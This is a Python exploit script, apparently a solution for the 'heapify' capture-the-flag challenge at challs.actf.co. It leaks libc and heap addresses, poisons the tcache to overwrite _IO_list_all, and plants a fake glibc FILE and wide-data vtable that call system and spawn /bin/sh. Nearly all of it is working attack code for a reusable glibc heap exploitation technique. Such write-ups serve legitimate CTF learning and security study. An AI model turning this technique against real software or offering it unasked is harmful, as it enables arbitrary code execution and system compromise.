#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./heapify_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")

ptr.logger.setLevel("DEBUG")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("challs.actf.co", 31501)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def safe_link(heap_base: int, offset: int, dest: int) -> int:
    return (heap_base + offset) >> 12 ^ dest


def main():
    io = connect()

    def alloc(size: int, data: bytes = b"", line: bool = True) -> int:
        io.sendlineafter("your choice: ", "1")
        io.sendlineafter("chunk size: ", str(size).encode())
        if line:
            io.sendlineafter("chunk data: ", data)
        else:
            io.sendafter("chunk data: ", data)
        io.recvuntil("chunk allocated at index: ")
        index = int(io.recvline().strip().decode())
        return index

    def free(index: int):
        io.sendlineafter("your choice: ", "2")
        io.sendlineafter("chunk index: ", str(index))
        return

    def view(index: int, size: int = 8) -> bytes:
        io.sendlineafter("your choice: ", "3")
        io.sendlineafter("chunk index: ", str(index))
        return io.recv(size)

    alloc(0x28)  # 0

    alloc(0x28)  # 1
    alloc(0x1)  # 2
    alloc(0x1)  # 3
    alloc(0x400)  # 4
    alloc(0x1)  # 5
    free(1)
    alloc(0x28, b"\x00" * 0x28 + ptr.p64(0x451))  # 6
    free(2)
    alloc(0x1)  # 7
    libc.base = ptr.u64(view(3, 6)) - unwrap(libc.symbol("main_arena")) - 96
    print(f"libc_base: {hex(libc.base)}")

    alloc(1)  # 8
    alloc(1)  # 9
    free(4)
    heap_base = ptr.u64(view(9, 5)) << 12
    print(f"heap_base: {hex(heap_base)}")

    # _IO_flush_all_lockp
    # fp.mode <= 0 && fp._IO_write_ptr > fp._IO_write_base
    # OR
    # fp.mode > 0 && fp._wide_data._IO_write_ptr > fp._wide_data._IO_write_base
    # THEN __overflow(fp)

    # _IO_wfile_overflow
    # f._flags & _IO_NO_WRITES(0x0008) == 0
    # AND
    # f._flags & _IO_CURRENTLY_PUTTING(0x0800) == 0
    # AND
    # f._wide_data._IO_write_base == 0
    # THEN  _IO_wdoallocbuf(f)

    # _IO_wdoallocbuf
    # fp._wide_data._IO_buf_base == 0
    # AND
    # fp._flags & _IO_UNBUFFERED == 0
    # THEN _IO_WDOALLOCATE(fp)
    #   THEN fp._wide_data._wide_vtable.__doallocate

    fake_io_addr = heap_base + 0x370
    fake_wide_data_addr = heap_base + 0x460
    fake_wide_vtable_addr = heap_base + 0x560

    # fake _IO_wide_data._wide_vtable
    fake_wide_vtable = b""
    fake_wide_vtable = fake_wide_vtable.ljust(104, b"\x00")
    fake_wide_vtable += ptr.p64(unwrap(libc.symbol("system")))

    # fake _IO_wide_data
    fake_wide_data = b""
    fake_wide_data = fake_wide_data.ljust(3, b"\x00")
    fake_wide_data += ptr.p64(0x0)  # _IO_write_base
    fake_wide_data += ptr.p64(0x1)  # _IO_write_ptr
    fake_wide_data = fake_wide_data.ljust(6, b"\x00")
    fake_wide_data += ptr.p64(0x0)  # _IO_buf_base
    fake_wide_data = fake_wide_data.ljust(224, b"\x00")
    fake_wide_data += ptr.p64(fake_wide_vtable_addr)  # _wide_vtable

    # fake _IO_FILE_complete_plus
    fake_io = b""
    fake_io += b"  /bin/sh\x00"  # flags
    fake_io = fake_io.ljust(0x20, b"\x00")
    fake_io += ptr.p64(0)  # _IO_write_base
    fake_io += ptr.p64(0xFFFFFFFF)  # _IO_write_ptr
    fake_io = fake_io.ljust(160, b"\x00")
    fake_io += ptr.p64(fake_wide_data_addr)  # _IO_wide_data
    fake_io = fake_io.ljust(216, b"\x00")
    fake_io += ptr.p64(unwrap(libc.symbol("_IO_wfile_jumps")))  # vtable

    print(f"fake_io_length: {hex(len(fake_io))}")
    print(f"fake_io_addr: {hex(fake_io_addr)}")
    print(f"fake_wide_data_length: {hex(len(fake_wide_data))}")
    print(f"fake_wide_data_addr: {hex(fake_wide_data_addr)}")
    print(f"fake_wide_vtable_length: {hex(len(fake_wide_vtable))}")
    print(f"fake_wide_vtable_addr: {hex(fake_wide_vtable_addr)}")

    alloc(0x3F0, b"A" * 0x3F0)  # 10
    alloc(len(fake_io), fake_io)  # 11
    alloc(len(fake_wide_data) + 1, fake_wide_data)  # 12
    alloc(len(fake_wide_vtable) + 1, fake_wide_vtable)  # 13

    alloc(0x38)  # 14
    alloc(0x38)  # 15
    alloc(0x38)  # 16
    free(16)
    free(15)
    free(14)
    alloc(
        0x38,
        b"A" * 0x8 * 7
        + ptr.p64(0x41)
        + ptr.p64(safe_link(heap_base, 0x3B0, unwrap(libc.symbol("_IO_list_all")))),
    )  # 17

    alloc(0x38)  # 18
    alloc(0x38, ptr.p64(fake_io_addr))  # 19

    io.sendlineafter("your choice: ", "0")
    io.sendline(b"echo pwned!")
    io.recvuntil(b"pwned!\n")
    io.sh()


if __name__ == "__main__":
    main()
